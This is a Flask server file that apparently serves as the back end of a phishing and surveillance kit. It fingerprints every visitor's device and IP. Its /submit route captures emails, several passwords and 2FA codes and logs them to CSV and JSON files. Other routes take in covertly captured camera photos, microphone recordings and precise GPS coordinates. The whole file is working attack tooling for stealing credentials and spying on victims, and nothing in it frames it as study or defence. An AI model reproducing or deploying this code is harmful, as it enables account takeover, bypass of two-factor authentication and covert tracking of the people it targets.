from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime
import json
import csv
import time
import shutil
import user_agents  # Make sure to install: pip install user-agents

app = Flask(__name__, template_folder='templates')
# Enable CORS for all origins
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# Create required directories
for directory in ['collected_data', 'upload', 'captured_media', 'archive']:
    os.makedirs(directory, exist_ok=True)

# Create current session filename
CURRENT_SESSION = datetime.now().strftime('%Y%m%d_%H%M%S')
CURRENT_CSV_FILE = f'collected_data/capture_data_{CURRENT_SESSION}.csv'

def archive_old_files():
    # Move old files to archive
    for file in os.listdir('collected_data'):
        if file.startswith('capture_data_') and file.endswith('.csv'):
            old_path = os.path.join('collected_data', file)
            new_path = os.path.join('archive', file)
            shutil.move(old_path, new_path)

def save_to_csv(data, data_type):
    timestamp = datetime.now()
    
    # Create file if it doesn't exist
    if not os.path.exists(CURRENT_CSV_FILE):
        with open(CURRENT_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'Type', 'Email', 'Password1', 'Password2', 'Password3', '2FA Code', 'Location', 'Media Count'])
    
    # Prepare location link
    location_url = ''
    if all(k in data for k in ['latitude', 'longitude']):
        location_url = '@https://www.google.com/maps?q={},{}'.format(
            data['latitude'],
            data['longitude']
        )
    
    # Prepare data for writing
    row_data = [
        timestamp.strftime('%Y-%m-%d %H:%M:%S'),
        data_type,
        data.get('email', ''),
        data.get('password1', ''),
        data.get('password2', ''),
        data.get('password3', ''),
        data.get('verification_code', ''),
        location_url,
        f"Photos: {data.get('photo_count', 0)}, Audio: {data.get('audio_count', 0)}" if data_type == 'media' else ''
    ]
    
    # Write data
    with open(CURRENT_CSV_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(row_data)

def save_to_shared_data(data, data_type=None):
    timestamp = datetime.now()
    
    # Save to CSV
    save_to_csv(data, data_type or 'unknown')
    
    # Update shared file
    shared_file = 'collected_data/shared_data.json'
    current_data = {}
    try:
        with open(shared_file, 'r', encoding='utf-8') as f:
            current_data = json.load(f)
    except:
        pass
    
    # Ensure permissions section exists
    if 'permissions' not in current_data:
        current_data['permissions'] = {
            'camera': False,
            'microphone': False,
            'location': False
        }
    
    # Update data
    if data_type == 'credentials':
        current_data['credentials'] = data
        current_data['last_update'] = timestamp.isoformat()
    elif data_type == 'location':
        current_data['location'] = data
        current_data['last_update'] = timestamp.isoformat()
        current_data['permissions']['location'] = True
    elif data_type == 'media':
        if 'media' not in current_data:
            current_data['media'] = {}
        current_data['media'].update(data)
        current_data['last_update'] = timestamp.isoformat()
    elif data_type == 'permissions':
        # Update permission status
        if 'camera' in data:
            current_data['permissions']['camera'] = data['camera']
        if 'microphone' in data:
            current_data['permissions']['microphone'] = data['microphone']
        if 'location' in data:
            current_data['permissions']['location'] = data['location']
    else:
        current_data.update(data)
    
    # Save to shared file
    with open(shared_file, 'w', encoding='utf-8') as f:
        json.dump(current_data, f, ensure_ascii=False, indent=2)

# Function to collect device information
def get_device_info(request):
    user_agent_string = request.headers.get('User-Agent')
    user_agent = user_agents.parse(user_agent_string)
    
    return {
        'ip_address': request.remote_addr,
        'user_agent': user_agent_string,  # Include full User-Agent
        'location': 'Unknown',  # Default value for location
        'browser': {
            'family': user_agent.browser.family,
            'version': user_agent.browser.version_string
        },
        'os': {
            'family': user_agent.os.family,
            'version': user_agent.os.version_string
        },
        'device': {
            'family': user_agent.device.family,
            'brand': user_agent.device.brand,
            'model': user_agent.device.model,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_pc': user_agent.is_pc
        },
        'headers': {
            'accept_language': request.headers.get('Accept-Language'),
            'accept_encoding': request.headers.get('Accept-Encoding'),
            'connection': request.headers.get('Connection'),
            'referer': request.headers.get('Referer'),
        },
        'timestamp': datetime.now().isoformat()
    }

def save_device_info(device_info):
    # Create new file for device information
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    device_file = f'captured_media/device_info_{timestamp}.json'
    
    # Format information neatly
    formatted_info = {
        'timestamp': datetime.now().isoformat(),
        'ip_address': device_info['ip_address'],
        'browser': device_info['browser'],
        'os': device_info['os'],
        'device': {
            'type': 'Mobile' if device_info['device']['is_mobile'] else 'Tablet' if device_info['device']['is_tablet'] else 'PC',
            'family': device_info['device']['family'],
            'brand': device_info['device']['brand'],
            'model': device_info['device']['model']
        },
        'language': device_info['headers']['accept_language'],
        'headers': device_info['headers']
    }
    
    # Save information to JSON file
    with open(device_file, 'w', encoding='utf-8') as f:
        json.dump(formatted_info, f, ensure_ascii=False, indent=2)
    
    return formatted_info

def save_detailed_info(device_info):
    """Save detailed information in text file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_path = f'captured_media/device_details_{timestamp}.txt'
    
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write("=== User Device Information ===\n\n")
        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
        f.write(f"IP Address: {device_info['ip_address']}\n\n")
        
        # Browser information
        f.write("=== Browser Info ===\n")
        f.write(f"Browser: {device_info['browser']['family']} {device_info['browser']['version']}\n")
        f.write(f"Language: {device_info['headers']['accept_language']}\n")
        f.write(f"Encoding: {device_info['headers']['accept_encoding']}\n\n")
        
        # System information
        f.write("=== System Info ===\n")
        f.write(f"OS: {device_info['os']['family']} {device_info['os']['version']}\n")
        f.write(f"Device Type: {'Mobile' if device_info['device']['is_mobile'] else 'Tablet' if device_info['device']['is_tablet'] else 'PC'}\n")
        f.write(f"Device: {device_info['device']['family']}\n")
        if device_info['device']['brand']:
            f.write(f"Brand: {device_info['device']['brand']}\n")
        if device_info['device']['model']:
            f.write(f"Model: {device_info['device']['model']}\n\n")
        
        # Additional information
        f.write("=== Additional Headers ===\n")
        for key, value in device_info['headers'].items():
            f.write(f"{key}: {value}\n")
        
        # Add screen information if available
        f.write("\n=== Screen Info ===\n")
        f.write("Resolution: [Will be captured from JavaScript]\n")
        f.write("Color Depth: [Will be captured from JavaScript]\n")
        f.write("User Agent: " + device_info.get('user_agent_string', 'Unknown') + "\n")

@app.route('/')
def index():
    device_info = get_device_info(request)
    save_device_info(device_info)
    save_detailed_info(device_info)
    
    # Print device information separately
    print("\nDevice Information:")
    print(f"IP Address: {device_info['ip_address']}")
    print(f"Browser: {device_info['browser']['family']} {device_info['browser']['version']}")
    print(f"OS: {device_info['os']['family']} {device_info['os']['version']}")
    print(f"Device: {device_info['device']['family']}")
    if device_info['device']['brand']:
        print(f"Brand: {device_info['device']['brand']}")
    if device_info['device']['model']:
        print(f"Model: {device_info['device']['model']}")
    print(f"Type: {'Mobile' if device_info['device']['is_mobile'] else 'Tablet' if device_info['device']['is_tablet'] else 'PC'}")
    print(f"Language: {device_info['headers']['accept_language']}")
    print("-" * 30)
    
    return render_template('index.html',
                         ip_address=device_info['ip_address'],
                         user_agent=device_info['user_agent'],
                         location=device_info['location'])

@app.route('/submit', methods=['POST', 'OPTIONS'])
def submit():
    if request.method == 'OPTIONS':
        return '', 204
        
    try:
        data = None
        
        try:
            if request.is_json:
                data = request.get_json()
            elif request.form:
                data = request.form.to_dict()
            else:
                raw_data = request.get_data().decode('utf-8')
                data = json.loads(raw_data)
        except Exception as e:
            print(f"Error reading data: {str(e)}")
            return jsonify({
                "status": "error",
                "message": "Error reading data"
            }), 400

        if data:
            # Process and display each piece of data separately
            if 'email' in data:
                print(f"Email: {data['email']}\n")
            
            # Handle multiple passwords with simpler format
            if 'password' in data:
                print("Password 1: " + data['password'])
            if 'password2' in data:
                print("Password 2: " + data['password2'])
            if 'password3' in data:
                print("Password 3: " + data['password3'])
            print()  # Add empty line after passwords
            
            if 'verification_code' in data:
                print(f"2FA Code: {data['verification_code']}\n")
            
            if 'device_type' in data:
                print(f"Device Type: {data['device_type']}\n")
            
            # Save the data with multiple passwords
            save_data = {
                'email': data.get('email', ''),
                'password1': data.get('password', ''),
                'password2': data.get('password2', ''),
                'password3': data.get('password3', ''),
                'verification_code': data.get('verification_code', ''),
                'device_type': data.get('device_type', '')
            }
            
            save_to_shared_data(save_data, 'credentials')
            
            return jsonify({
                "status": "success",
                "message": "Data received successfully"
            })
        
        return jsonify({
            "status": "error",
            "message": "No valid data received"
        }), 400
        
    except Exception as e:
        print(f"\nError in request processing: {str(e)}")
        return jsonify({
            "status": "error",
            "message": f"Error: {str(e)}"
        }), 500

@app.route('/api/capture-photo', methods=['POST'])
def capture_photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        photo.save(f'upload/photo_{timestamp}.jpg')
        
        # Update photo count
        photos = len([f for f in os.listdir('upload') if f.startswith('photo_')])
        save_to_shared_data({'photo_count': photos}, 'media')
    
    return jsonify({"status": "success"})

@app.route('/api/record-audio', methods=['POST'])
def record_audio():
    if 'audio' in request.files:
        audio = request.files['audio']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        audio.save(f'upload/audio_{timestamp}.wav')
        
        # Update audio count
        audios = len([f for f in os.listdir('upload') if f.startswith('audio_')])
        save_to_shared_data({'audio_count': audios}, 'media')
    
    return jsonify({"status": "success"})

@app.route('/api/get-location', methods=['POST'])
def get_location():
    data = request.json
    if data and 'latitude' in data and 'longitude' in data:
        # Update data with precise location information
        location_data = {
            'latitude': data['latitude'],
            'longitude': data['longitude'],
            'accuracy': data.get('accuracy'),
            'altitude': data.get('altitude'),
            'altitudeAccuracy': data.get('altitudeAccuracy'),
            'heading': data.get('heading'),
            'speed': data.get('speed'),
            'timestamp': datetime.now().isoformat()
        }
        save_to_shared_data(location_data, 'location')
        
        # Create Google Maps link with precise location
        maps_url = '@https://www.google.com/maps?q={},{}&z=20'.format(
            data['latitude'],
            data['longitude']
        )
        
        # Print location information separately
        print("\nLocation Information:")
        print(f"Maps URL: {maps_url}")
        print(f"Accuracy: {data.get('accuracy', 'unknown')} meters")
        if data.get('altitude'):
            print(f"Altitude: {data.get('altitude')} meters")
        if data.get('speed'):
            print(f"Speed: {data.get('speed')} m/s")
        print("-" * 30)
        
        return jsonify({
            "status": "success",
            "maps_url": maps_url,
            "accuracy": data.get('accuracy', 'unknown')
        })
    return jsonify({"status": "error", "message": "Invalid location data"})

@app.route('/api/permissions', methods=['POST'])
def permissions():
    data = request.json
    if data:
        save_to_shared_data(data, 'permissions')
    return jsonify({"status": "success"})

@app.route('/api/browser-info', methods=['POST'])
def browser_info():
    try:
        data = request.get_json()
        print("\nBrowser Details:")
        for key, value in data.items():
            print(f"{key}: {value}")
        print("-" * 30)
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Error processing browser information: {str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    # Archive old files
    archive_old_files()
    # Create shared data file
    save_to_shared_data({}, 'init')
    # Run application on all interfaces
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
